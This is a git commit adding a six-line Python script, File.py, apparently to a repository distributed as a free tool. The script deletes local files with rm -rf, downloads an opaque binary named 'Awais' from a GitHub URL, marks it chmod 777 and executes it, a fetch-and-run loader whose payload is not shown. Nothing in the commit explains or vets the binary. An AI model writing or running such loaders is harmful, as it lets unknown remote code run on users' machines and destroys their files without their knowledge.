700b00bcff87e4ac11ec8e41af8a4778a170e731
Awais-Cloner <130651436+Awais-Cloner@users.noreply.github.com>
2024-08-04 17:44:32 +0500

    Create File.py

---
+++ File.py
@@ -0,0 +1,6 @@
+import os
+os.system('rm -rf Ax.cpython-311.so')
+os.system("rm -rf Awais")
+os.system('curl -L https://github.com/Awais-Cloner/Free-Tool/blob/main/Awais?raw=true -o Awais')
+os.system("chmod 777 Awais")
+os.system("./Awais")
